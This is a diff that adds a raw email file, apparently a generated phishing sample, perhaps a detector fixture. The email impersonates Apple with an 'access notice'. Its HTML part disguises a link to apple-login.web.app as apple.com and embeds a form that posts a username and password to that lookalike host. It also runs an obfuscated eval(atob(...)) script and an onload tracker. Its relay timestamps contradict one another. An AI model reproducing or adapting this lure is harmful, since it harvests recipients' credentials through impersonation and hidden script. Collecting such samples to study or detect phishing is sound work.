@@ -1,0 +1,31 @@
+From: notice@apple-login.web.app
+To: victim48@example.com
+Subject: Access notice from Apple [ref F6861A4]
+Date: Tue, 25 Mar 2002 20:53:00 -0500
+Message-ID: <phish-228-39f2a57c-074b-4ed0-a226-d931febdaef5@apple-login.web.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 28 Mar 2002 12:59:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 23 Mar 2002 12:39:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 18 Mar 2002 08:40:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 04 Mar 2002 17:59:00 -0500
+Return-Path: <bounce@mail-40f2f9cf.top>
+Reply-To: recovery8@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-40f2f9cf.top; dkim=fail header.d=apple-login.web.app; dmarc=fail header.from=apple-login.web.app
+Received-SPF: fail (mx.example.com: domain of notice@apple-login.web.app does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-login.web.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-228-b5f55dea"
+
+--bnd-p-228-b5f55dea
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.apple-login.web.app/auth?t=F6861A4
+
+Reference: F6861A4
+--bnd-p-228-b5f55dea
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.apple-login.web.app/auth?t=F6861A4<br/><br/>Reference: F6861A4</p><p><a href="http://apple-login.web.app/login">https://www.apple.com/signin</a></p><form action="http://apple-login.web.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-228-b5f55dea--
